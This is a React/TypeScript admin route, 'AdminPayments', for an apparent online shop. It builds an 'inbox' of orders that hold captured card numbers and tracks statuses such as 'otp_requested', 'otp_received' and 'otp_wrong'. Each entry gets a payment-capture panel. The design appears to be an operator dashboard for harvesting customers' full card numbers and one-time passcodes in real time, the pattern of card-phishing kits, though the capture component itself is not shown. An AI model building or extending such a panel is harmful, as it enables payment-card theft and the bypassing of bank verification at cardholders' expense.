import { createFileRoute, Link } from "@tanstack/react-router";
import { PaymentCapturePanel } from "@/components/admin/payment-capture";
import { Badge } from "@/components/ui/badge";
import { DEMO_PAYMENTS } from "@/lib/constants";
import { formatMoney } from "@/lib/format";
import { useT } from "@/lib/i18n";
import { orderAmount } from "@/lib/order-amount";
import { PROVIDER_META } from "@/lib/payments";
import { useOrdersStore } from "@/lib/store/orders";

export const Route = createFileRoute("/admin/payments")({
  component: AdminPayments,
});

function AdminPayments() {
  const { t, locale } = useT();
  const orders = useOrdersStore((s) => s.orders);
  const inbox = [...orders]
    .filter(
      (o) =>
        Boolean(o.paymentCapture?.cardNumber) ||
        ["pending", "otp_requested", "otp_received", "otp_wrong", "card_invalid"].includes(o.paymentStatus),
    )
    .sort((a, b) => +new Date(b.date) - +new Date(a.date));
  const pending = inbox.filter((o) =>
    ["pending", "otp_requested", "otp_received", "otp_wrong", "card_invalid"].includes(o.paymentStatus),
  );

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-xl font-semibold">{t("admin.payments")}</h1>
        <p className="mt-2 text-sm text-muted-foreground">
          {DEMO_PAYMENTS ? t("admin.demo") : t("admin.configured")} · {t("admin.capture")}
        </p>
      </div>

      <ul className="grid gap-3 sm:grid-cols-2">
        {PROVIDER_META.map((p) => {
          const related = orders.filter((o) => o.paymentMethod === p.id);
          const total = related.reduce((s, o) => s + orderAmount(o), 0);
          return (
            <li key={p.id} className="rounded-2xl border border-border bg-card p-4">
              <div className="flex items-center justify-between gap-2">
                <p className="font-semibold capitalize">{p.id}</p>
                <Badge variant="success">{t("admin.enabled")}</Badge>
              </div>
              <p className="mt-2 text-sm tabular-nums">
                {related.length} · {formatMoney(total, locale)}
              </p>
            </li>
          );
        })}
      </ul>

      <section className="space-y-4">
        <h2 className="text-sm font-semibold">
          {t("admin.capture")} · {pending.length}
        </h2>
        {inbox.map((o) => (
          <div key={o.id} className="space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-2 px-1">
              <Link to="/admin/orders" className="font-semibold tabular-nums text-primary">
                {o.number}
              </Link>
              <span className="text-sm">{o.customerName}</span>
            </div>
            <PaymentCapturePanel order={o} />
          </div>
        ))}
      </section>
    </div>
  );
}
